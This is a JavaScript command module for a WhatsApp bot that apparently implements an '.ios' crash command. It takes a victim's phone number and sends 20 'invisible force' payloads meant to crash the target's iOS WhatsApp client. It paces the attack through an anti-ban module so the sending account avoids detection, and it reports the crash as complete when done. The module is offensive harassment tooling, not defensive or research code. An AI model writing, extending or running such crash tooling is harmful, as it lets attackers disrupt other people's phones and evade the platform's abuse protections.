'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'ios',
    aliases: ['ioscrash', 'iosforce'],
    category: 'madaraeye',
    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ',
    usage: '.ios <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
        if (!args[0]) return sock.sendMessage(ctx.from, { text: `❌ *Usage:* ${prefix}ios <number>` }, { quoted: msg });
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);
        const TOTAL = 20;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                let allowed = false;
                while (!allowed) {
                    try { await canCrash(phone); allowed = true; }
                    catch (e) {
                        const waitMatch = e.message.match(/(\d+)s/);
                        const waitSec = waitMatch ? parseInt(waitMatch[1]) : 30;
                        await bar.setPhase(`⏳ ${e.message}`);
                        const chunks = Math.ceil(waitSec / 5);
                        for (let c = 0; c < chunks; c++) {
                            await new Promise(r => setTimeout(r, 5000));
                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${Math.max(0, waitSec - (c + 1) * 5)}s`);
                        }
                    }
                }
                await eye.iosInvisibleForce(target);
                await recordCrash(phone);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
            }
            await bar.done(`✅ ɪᴏs ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${target}`);
        } catch (e) { await bar.done(`❌ ${e.message}`); }
    }
};